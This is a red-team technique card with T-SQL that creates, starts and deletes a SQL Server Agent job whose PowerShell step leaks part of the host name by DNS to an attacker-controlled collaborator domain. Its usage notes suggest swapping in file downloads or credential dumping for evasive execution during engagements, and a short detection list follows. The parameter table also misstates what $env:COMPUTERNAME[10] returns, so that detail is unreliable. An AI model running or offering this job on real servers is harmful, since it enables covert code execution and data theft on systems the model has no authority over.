---
type: code
language: sql
verified: true
tags:
  - sql-agent
  - powershell-execution
  - t-sql-job
platforms:
  - Windows
  - SQL Server
validated: true
---

# Create SQL Agent Job with PowerShell Step

## Code

```sql
USE msdb; 
EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; 
EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'$name=$env:COMPUTERNAME[10];nslookup "$name.redacted.burpcollaborator.net"', @retry_attempts = 1, @retry_interval = 5 ;
EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; 
EXEC dbo.sp_start_job N'test_powershell_job1';

-- delete
EXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';
```

## Description

This T-SQL code snippet creates a SQL Server Agent Job in the msdb database, adds a PowerShell step to execute a command (here, nslookup using part of the computer name), targets the local server, starts the job, and deletes it for cleanup. It enables arbitrary PowerShell execution via legitimate SQL services, suitable for evasion in red team operations.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| @job_name | Unique name for the job | N'test_powershell_job1' |
| @step_name | Name for the job step | N'test_powershell_name1' |
| @subsystem | Execution subsystem (PowerShell for PS code) | N'PowerShell' |
| @command | The PowerShell script to run | N'$name=$env:COMPUTERNAME[10];nslookup "$name.redacted.burpcollaborator.net"' |
| @retry_attempts | Retry count on failure | 1 |
| @retry_interval | Retry delay in seconds | 5 |
| $name | Derived from $env:COMPUTERNAME (first 10 chars) | Derived dynamically |
| redacted.burpcollaborator.net | Attacker-controlled DNS domain | yourdomain.com |

## Usage

Execute this in a SQL query tool connected to the target instance with job privileges. Use for quick command execution during engagements; replace the @command with other PS code like file downloads or credential dumping. Monitor job history post-execution to confirm results.

## Detection

- Auditing of msdb schema changes or sp_add_job executions.
- Agent Job history queries revealing PowerShell steps with suspicious commands (e.g., nslookup to external domains).
- DNS logs showing queries to collaborator domains from SQL hosts.
- Privilege audit logs for sysadmin actions creating transient jobs.

## Related

- [[procedures/sql-agent-job-powershell-execution]]
- [[commands/create-powershell-job-and-execute-nslookup]]
